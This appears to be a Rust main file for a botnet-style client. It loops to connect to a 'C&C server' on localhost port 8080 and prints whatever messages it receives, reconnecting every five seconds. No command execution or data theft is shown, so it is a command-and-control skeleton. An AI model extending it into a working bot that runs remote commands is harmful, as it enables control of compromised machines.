use tokio::signal;
use tokio::io::AsyncWriteExt;
use std::time::Duration;
use std::thread;

mod socket;

const IP: &'static str = "127.0.0.1";
const PORT: u16 = 8080;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // This is a reconnection loop if something goes wrong.
    loop {
        thread::sleep(Duration::from_millis(5000));
        // connect to the socket
        let connection = socket::connect_to_cnc(IP, PORT).await;
        if let Err(e) = connection {continue} // Break if connection refused.
        println!("Connected to C&C server successfully");
        let stream = socket::SocketStream::new(connection.unwrap());
        // Message reading loop
        loop {
            let msg = stream.consume_message().await;

            if let Err(ref e) = msg {
                if e.kind() == std::io::ErrorKind::WouldBlock {
                    continue
                }
                break
            } // this error probably indicates about block of the read abilities.

            let (msg, n_bytes) = msg.unwrap();
            
            if n_bytes == 0 {
                break // try to reconnect
            }

            println!("Msg -> {}", String::from_utf8(msg)?);
        }

        eprintln!("Disconnected, trying to reconnect in 5 seconds...");
        thread::sleep(Duration::from_millis(5000))
    }

    signal::ctrl_c().await?;
    Ok(())
}
